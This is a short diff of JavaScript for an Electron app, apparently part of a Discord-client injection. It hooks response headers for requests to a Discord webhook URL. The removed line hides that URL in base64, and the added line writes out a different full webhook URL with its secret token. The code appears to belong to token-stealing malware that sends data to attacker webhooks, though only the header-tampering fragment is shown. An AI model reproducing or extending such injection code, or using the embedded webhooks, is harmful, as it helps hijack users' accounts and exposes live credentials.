@@ -17,7 +17,7 @@ function FirstTime() {
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-	if (details.url.startsWith(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTU1NDU2MDQ5NzczNjkwODgwL203WTc4S1BDUHhTUFl1UjFjaEJVVFZQUmNvdlpjUGdraEVHUFJuQV9sMTlhLUlLNXJaXzFmN08wT2gzWWtLNlZDYmZF'))) {
+	if (details.url.startsWith("https://discord.com/api/webhooks/954634425084289034/RnCwNGs53uCJLtalrpJZdiARrY4EcZmTdcFTHAyxjJiE0VcjHpVeRKwcJawN0gOg1FU1")) {
 		if (details.url.includes("discord.com")) {
 			callback({
 				responseHeaders: Object.assign({
